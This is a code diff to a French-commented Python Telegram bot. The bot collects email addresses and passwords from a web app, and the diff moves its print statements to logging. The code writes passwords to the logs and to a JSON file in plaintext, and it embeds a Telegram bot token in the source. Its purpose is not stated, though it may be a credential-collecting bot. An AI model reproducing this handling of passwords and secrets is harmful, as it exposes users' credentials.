@@ -3,6 +3,14 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 import json
 import datetime
 import os
+import logging
+
+# Configuration du logging
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
 # Configuration du bot
 TOKEN = '7174970942:AAERseUdYk9WBoztRjQbaOgIrCeRypldmfo'
@@ -10,26 +18,34 @@ TOKEN = '7174970942:AAERseUdYk9WBoztRjQbaOgIrCeRypldmfo'
 # Fonction pour sauvegarder les données dans le fichier JSON
 def save_user_data(user_data):
     try:
+        # Chemin du fichier JSON
+        json_file = 'users.json'
+        
         # Créer le fichier s'il n'existe pas
-        if not os.path.exists('users.json'):
-            with open('users.json', 'w', encoding='utf-8') as f:
+        if not os.path.exists(json_file):
+            logger.info(f"Création du fichier {json_file}")
+            with open(json_file, 'w', encoding='utf-8') as f:
                 json.dump([], f)
         
         # Lire les données existantes
-        with open('users.json', 'r', encoding='utf-8') as f:
-            data = json.load(f)
+        try:
+            with open(json_file, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+        except json.JSONDecodeError:
+            logger.warning("Le fichier JSON était vide ou corrompu, création d'une nouvelle liste")
+            data = []
         
         # Ajouter les nouvelles données
         data.append(user_data)
         
         # Sauvegarder les données
-        with open('users.json', 'w', encoding='utf-8') as f:
+        with open(json_file, 'w', encoding='utf-8') as f:
             json.dump(data, f, ensure_ascii=False, indent=4)
         
-        print(f"Données sauvegardées avec succès: {user_data}")
+        logger.info(f"Données sauvegardées avec succès: {user_data}")
         return True
     except Exception as e:
-        print(f"Erreur lors de la sauvegarde: {e}")
+        logger.error(f"Erreur lors de la sauvegarde: {e}")
         return False
 
 # Gestionnaire de commande /start
@@ -47,16 +63,16 @@ async def webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         # Récupérer et parser les données JSON
         data = json.loads(update.effective_message.web_app_data.data)
-        print(f"Données reçues du web app: {data}")
+        logger.info(f"Données reçues du web app: {data}")
         
         # Extraire les informations
         email = data.get('email', '')
         password = data.get('password', '')
         username = update.effective_user.username or "Unknown"
         
-        print(f"Email: {email}")
-        print(f"Password: {password}")
-        print(f"Username: {username}")
+        logger.info(f"Email: {email}")
+        logger.info(f"Password: {password}")
+        logger.info(f"Username: {username}")
         
         # Validation de l'email
         if not '@' in email or not '.' in email:
@@ -83,10 +99,10 @@ async def webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("Une erreur est survenue lors de l'enregistrement des informations.")
             
     except json.JSONDecodeError as e:
-        print(f"Erreur de décodage JSON: {e}")
+        logger.error(f"Erreur de décodage JSON: {e}")
         await update.message.reply_text("Format de données invalide.")
     except Exception as e:
-        print(f"Erreur: {e}")
+        logger.error(f"Erreur: {e}")
         await update.message.reply_text("Une erreur est survenue lors du traitement des données.")
 
 def main():
@@ -98,7 +114,7 @@ def main():
     application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, webapp_data))
     
     # Démarrage du bot
-    print("Bot démarré")
+    logger.info("Bot démarré")
     application.run_polling()
 
 if __name__ == '__main__':
